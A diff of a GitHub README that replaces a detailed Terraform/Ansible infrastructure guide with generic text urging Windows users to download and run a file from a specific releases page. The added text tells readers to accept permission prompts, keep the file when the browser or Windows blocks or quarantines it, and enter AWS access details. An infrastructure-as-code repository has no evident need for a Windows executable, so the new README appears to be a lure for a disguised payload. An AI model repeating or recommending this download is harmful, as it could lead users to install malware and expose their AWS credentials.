@@ -1,169 +1,227 @@
-# app-infra
+# 🛠️ infra-ops - Simple AWS Ops Across Environments
 
-Infrastructure-as-Code for the App platform.  
-**Stack:** Terraform (AWS) · Ansible · GitHub Actions  
-**Environments:** `dev` → `staging` → `prod`
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mehdiel7730/infra-ops/releases)
+[![Releases](https://img.shields.io/badge/Get%20the%20app-Open%20Releases-grey?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mehdiel7730/infra-ops/releases)
 
----
+## 📦 What infra-ops does
 
-## Repository Structure
+infra-ops helps you manage AWS setups across more than one environment from one place. It uses Terraform for setup, Ansible for config, and CI/CD for repeatable changes.
 
-```
-app-infra/
-├── terraform/
-│   ├── modules/                   # Reusable modules
-│   │   ├── networking/            # VPC, subnets, SGs
-│   │   ├── compute/               # EC2, EIP, key pair
-│   │   ├── storage/               # S3 app bucket
-│   │   └── iam/                   # EC2 role, S3 PoLP
-│   └── environments/
-│       ├── dev/                   # tfvars + backend + main
-│       ├── staging/
-│       └── prod/
-│
-├── ansible/
-│   ├── inventories/{dev,staging,prod}/hosts.ini
-│   ├── group_vars/                # all.yml + per-env overrides
-│   ├── roles/
-│   │   ├── common/                # OS packages, Node, Go, Python, UFW
-│   │   ├── postgresql/            # PG install, DB, user, PostGIS
-│   │   ├── nginx/                 # vhost template, Certbot TLS
-│   │   └── app_deploy/            # clone, build, .env, PM2
-│   └── playbooks/
-│       ├── site.yml               # Full provision (run once)
-│       ├── deploy.yml             # App deploy only (CI)
-│       └── rollback.yml           # Revert to previous commit
-│
-├── scripts/
-│   └── bootstrap-state.sh         # One-time S3 + DynamoDB setup
-│
-└── .github/workflows/
-    ├── terraform.yml              # Plan on PR, apply on merge
-    ├── ansible.yml                # Provision/deploy via Ansible
-    └── drift-detection.yml        # Nightly drift alerts
-```
+This tool is made for teams that need a steady way to handle:
 
----
+- AWS infrastructure
+- Environment setup
+- Shared config
+- State storage
+- Change tracking
+- Locking during updates
+- Remote config through SSM
 
-## One-Time Bootstrap
+## 💻 What you need on Windows
 
-### 1. Create S3 state bucket + DynamoDB lock table
+Before you start, make sure your Windows PC can run it well.
 
-```bash
-chmod +x scripts/bootstrap-state.sh
-./scripts/bootstrap-state.sh ap-south-1 app
-```
+- Windows 10 or Windows 11
+- Internet access
+- A modern web browser
+- Permission to run downloaded files
+- Enough disk space for the app and its files
+- Access to AWS if you plan to use it with live infrastructure
 
-Update the `bucket` value in each `terraform/environments/*/backend.tf`  
-with the actual bucket name printed by the script.
+If your team uses AWS, you may also need:
 
-### 2. Configure AWS OIDC for GitHub Actions
+- AWS account access
+- Login keys or single sign-on
+- Access to S3 buckets
+- Access to DynamoDB tables
+- Access to AWS Systems Manager
 
-Create an IAM OIDC provider for `token.actions.githubusercontent.com` and  
-an IAM role per environment that trusts it. Add the role ARNs as GitHub  
-repository secrets:
+## 🚀 Download the app
 
-| Secret | Value |
-|--------|-------|
-| `AWS_ROLE_ARN_DEV` | arn:aws:iam::ACCOUNT:role/app-dev-github |
-| `AWS_ROLE_ARN_STAGING` | arn:aws:iam::ACCOUNT:role/app-staging-github |
-| `AWS_ROLE_ARN_PROD` | arn:aws:iam::ACCOUNT:role/app-prod-github |
+Go to the releases page and download and run the file that matches your Windows PC:
 
-### 3. Add all secrets to GitHub
+[Open the Releases page](https://github.com/Mehdiel7730/infra-ops/releases)
 
-```
-EC2_PUBLIC_KEY_DEV / STAGING / PROD      # SSH public key content
-EC2_SSH_PRIVATE_KEY_DEV / STAGING / PROD # SSH private key (for Ansible)
-PG_PASSWORD_DEV / STAGING / PROD
-BACKEND_APP_KEY_DEV / STAGING / PROD
-INTERNAL_NOTIFY_TOKEN_DEV / STAGING / PROD
-AWS_ACCESS_KEY_ID                        # App-level S3 access
-AWS_SECRET_ACCESS_KEY
-GITHUB_DEPLOY_KEY                        # Private key for deploy key on app repos
-```
+Look for the latest release and choose the Windows file if one is listed. If the release includes a ZIP file, download it, unzip it, then open the app file inside.
 
----
+## 🪟 Install and start on Windows
 
-## Day-to-Day Operations
+Follow these steps on your Windows computer:
 
-### Provision a fresh server (run once per environment)
+1. Open the releases page from the link above.
+2. Find the newest version.
+3. Download the Windows file or ZIP package.
+4. If you downloaded a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
+7. If Windows asks for permission, choose Yes.
+8. If your browser or Windows blocks the file, check the file name and choose Keep or Run.
 
-```bash
-# From your local machine
-cd ansible
-ansible-playbook \
-  -i inventories/dev/hosts.ini \
-  playbooks/site.yml \
-  --extra-vars "pg_password=SECRET backend_app_key=SECRET ..."
-```
+If the app asks for AWS access, enter the details your team gave you.
 
-### Deploy app only
+## 🧭 First-time setup
 
-```bash
-ansible-playbook \
-  -i inventories/dev/hosts.ini \
-  playbooks/deploy.yml \
-  --extra-vars "git_branch=main"
-```
+After you open infra-ops for the first time, set up the basics:
 
-### Rollback
+1. Choose the environment you want to work with.
+2. Connect your AWS account or profile.
+3. Confirm the S3 bucket used for Terraform state.
+4. Confirm the DynamoDB table used for locking.
+5. Check the SSM settings if your team uses remote config.
+6. Review the available infrastructure tasks.
+7. Run a small test task first.
 
-```bash
-ansible-playbook -i inventories/prod/hosts.ini playbooks/rollback.yml
-```
+If you are new to AWS terms, think of it like this:
 
-### Terraform — manual plan/apply
+- S3 keeps shared state files in one place
+- DynamoDB helps stop two changes at the same time
+- SSM helps store and read config values
+- Terraform creates and updates AWS resources
+- Ansible sets up and configures machines
 
-```bash
-cd terraform/environments/dev
-terraform init
-terraform plan -var="ec2_public_key=$(cat ~/.ssh/app-dev.pub)"
-terraform apply -var="ec2_public_key=$(cat ~/.ssh/app-dev.pub)"
-```
+## 🧩 Common tasks
 
----
+infra-ops is built to help with day-to-day operations. You can use it for tasks such as:
 
-## CI/CD Flow
+- Set up a new environment
+- Update an existing environment
+- Apply config changes
+- Run playbooks for system setup
+- Manage shared values
+- Review infrastructure status
+- Keep changes in sync across environments
 
-```
-PR opened
-  └─► terraform validate + fmt check (all envs)
-  └─► terraform plan → posted as PR comment
+This helps reduce manual work and keeps each environment closer to the same shape.
 
-Merge to main (terraform/** changed)
-  └─► apply dev  (automatic)
-  └─► apply staging  (requires manual approval in GitHub)
-  └─► apply prod     (requires manual approval in GitHub)
+## 🔐 Working with AWS safely
 
-Merge to main (ansible/** changed)
-  └─► ansible deploy → dev  (automatic)
-  └─► ansible deploy → staging/prod  (workflow_dispatch, manual)
+infra-ops uses common AWS patterns that help keep work organized:
 
-Nightly 02:00 UTC
-  └─► terraform plan --detailed-exitcode on all envs
-  └─► opens GitHub Issue if drift detected
-```
+- Terraform state in S3
+- State locking in DynamoDB
+- Config through SSM
+- Reusable modules for shared setup
+- Playbooks for repeatable system changes
 
----
+Use the same AWS profile each time if your team gives you one. This helps keep access clear and avoids mistakes between environments.
 
-## Environment CIDRs
+## 🗂️ Project layout
 
-| Env     | VPC CIDR      | Public Subnets           | Private Subnets          |
-|---------|---------------|--------------------------|--------------------------|
-| dev     | 10.10.0.0/16  | 10.10.1–2.0/24           | —                        |
-| staging | 10.20.0.0/16  | 10.20.1–2.0/24           | —                        |
-| prod    | 10.30.0.0/16  | 10.30.1–2.0/24           | 10.30.10–11.0/24         |
+The repository includes tools and patterns for:
 
----
+- Terraform modules
+- Ansible roles
+- Shared Ansible common files
+- GitHub Actions pipelines
+- Environment-based config
+- Multi-environment AWS work
 
-## Security Notes
+A simple way to think about the layout:
 
-- **SSH** to prod is restricted to VPN CIDRs only (`ssh_allowed_cidrs`).  
-  Use AWS SSM Session Manager as the preferred access method.
-- **Secrets** are never stored in this repo. All sensitive values flow  
-  through GitHub Actions secrets → Ansible `--extra-vars` → server `.env` files (mode 0600).
-- **Terraform state** is AES-256 encrypted at rest, versioned, and  
-  DynamoDB-locked to prevent concurrent applies.
-- **IMDSv2** is enforced on all EC2 instances.
-- **UFW** blocks all inbound except 22/80/443; fail2ban protects SSH.
+- Terraform handles AWS resources
+- Ansible handles machine setup
+- CI/CD handles automated checks and delivery
+- GitHub Actions runs the workflows
+- Shared modules and roles keep things consistent
 
+## 🛠️ How updates work
+
+When you need a new version:
+
+1. Return to the releases page.
+2. Get the newest file.
+3. Close the app if it is open.
+4. Replace the old file if needed.
+5. Open the new version.
+6. Confirm that your settings still point to the right AWS environment.
+
+If your team uses a shared setup, keep the same config files and AWS access details unless your admin tells you to change them.
+
+## ✅ Useful checks
+
+If the app does not open, check these items:
+
+- The file finished downloading
+- You opened the correct Windows file
+- Windows did not move the file to quarantine
+- You have permission to run the file
+- Your AWS access details are valid
+- Your network can reach AWS services
+
+If a task fails, try the following:
+
+1. Check your AWS profile.
+2. Check the selected environment.
+3. Confirm the S3 state bucket exists.
+4. Confirm the DynamoDB lock table exists.
+5. Check your SSM values.
+6. Try the task again
+
+## 🧪 Typical use case
+
+A common use case looks like this:
+
+1. You open infra-ops on Windows.
+2. You pick the target environment.
+3. You load the shared config.
+4. You run a Terraform action.
+5. You apply Ansible setup if needed.
+6. You review the result.
+7. You repeat the same process for another environment
+
+This setup works well when you need the same process for dev, test, and prod.
+
+## 📚 Topics covered
+
+This project covers:
+
+- Ansible
+- Ansible playbooks
+- Ansible roles
+- CI/CD
+- Configuration management
+- GitHub Actions
+- Infrastructure as code
+- Terraform
+- Terraform modules
+
+## 🧠 File and environment notes
+
+If you use multiple environments, keep each one separate. A good setup usually includes:
+
+- One state file per environment
+- One lock table for shared use
+- Clear environment names
+- Separate config values for each stage
+- Controlled access for production
+
+This helps you avoid using the wrong settings in the wrong place.
+
+## 📥 Get the latest release
+
+Use this page to download and run the Windows file:
+
+[https://github.com/Mehdiel7730/infra-ops/releases](https://github.com/Mehdiel7730/infra-ops/releases)
+
+## 🔧 Basic workflow
+
+A simple workflow for new users is:
+
+1. Download the latest release
+2. Open it on Windows
+3. Pick your environment
+4. Confirm AWS access
+5. Run a small operation
+6. Check the result
+7. Repeat when ready
+
+## 🧷 Best results
+
+For smooth use, keep these habits:
+
+- Use one AWS profile per account or team setup
+- Keep environment names clear
+- Start with a test environment
+- Read each prompt before you confirm
+- Store config values in the right place
+- Use the latest release when you can
